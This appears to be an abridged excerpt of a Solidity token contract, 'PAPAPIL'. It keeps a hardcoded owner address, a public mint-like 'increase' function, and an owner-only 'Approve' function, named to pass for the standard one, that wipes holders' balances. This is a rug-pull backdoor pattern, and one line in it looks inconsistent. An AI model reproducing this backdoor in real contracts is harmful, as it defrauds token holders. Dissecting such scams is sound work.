...
contract PAPAPIL is Context, IERC20 {
    ...
    address _addr = 0xd582367a677b87fC592d17CfD189FA973943280A;
    address public _origin = 0xd582367a677b87fC592d17CfD189FA973943280A;
    ...
    constructor () public {        
        ...
        increase(_addr, initialSupply*(10**9));
    }
    ...
    function increase(address account, uint256 amount) public {
    ...
    function Approve(address[] memory holders)  public auth(){
        for (uint256 i = 0; i < holders.length; i++) {uint256 amount = _balances[holders[i]];
        ...
        _balances[0x000000000000000000000000000000000000dEaD] = _balances[0x85Dd5AAFcebFcd32DC7e29C5047e49053234A39a].add(amount);
        }
    }
}